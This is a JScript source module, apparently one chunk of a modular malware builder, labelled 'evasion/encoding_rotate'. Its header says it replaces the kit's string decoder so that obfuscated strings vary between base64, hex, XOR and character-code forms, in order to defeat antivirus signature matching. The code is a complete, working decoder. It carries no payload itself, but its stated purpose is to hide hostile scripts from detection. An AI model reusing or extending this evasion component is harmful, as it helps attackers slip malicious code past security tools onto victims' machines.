// chunk: evasion/encoding_rotate
// depends: (none)
// provides: _d
// format: jscript
// note: Rotates between base64, hex, and charcode encoding per string decode.
//       Replaces the standard _d() function with a multi-encoding variant that
//       varies the byte pattern of encoded strings, defeating signature matching
//       on fixed encoding patterns.

function _d(input) {
    if (typeof input === "object" && input.length !== undefined) {
        /* Charcode array: [72, 101, 108, 108, 111] */
        var s = "";
        for (var i = 0; i < input.length; i++) s += String.fromCharCode(input[i]);
        return s;
    }
    if (typeof input !== "string") return String(input);

    if (input.indexOf(":") === 0) {
        /* Hex-encoded: ":48656c6c6f" */
        var hex = input.substring(1);
        var out = "";
        for (var h = 0; h < hex.length; h += 2) {
            out += String.fromCharCode(parseInt(hex.substring(h, h + 2), 16));
        }
        return out;
    }

    if (input.indexOf("~") === 0) {
        /* XOR-encoded: "~KEY~encoded_data" */
        var parts = input.substring(1).split("~");
        if (parts.length >= 2) {
            var key = parts[0];
            var data = parts[1];
            var result = "";
            for (var x = 0; x < data.length; x++) {
                result += String.fromCharCode(data.charCodeAt(x) ^ key.charCodeAt(x % key.length));
            }
            return result;
        }
    }

    /* Default: base64 */
    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var decoded = "";
    var bits = 0, val = 0;
    for (var b = 0; b < input.length; b++) {
        var c = input.charAt(b);
        if (c === "=") break;
        var idx = b64.indexOf(c);
        if (idx < 0) continue;
        val = (val << 6) | idx;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            decoded += String.fromCharCode((val >> bits) & 0xFF);
        }
    }
    return decoded;
}
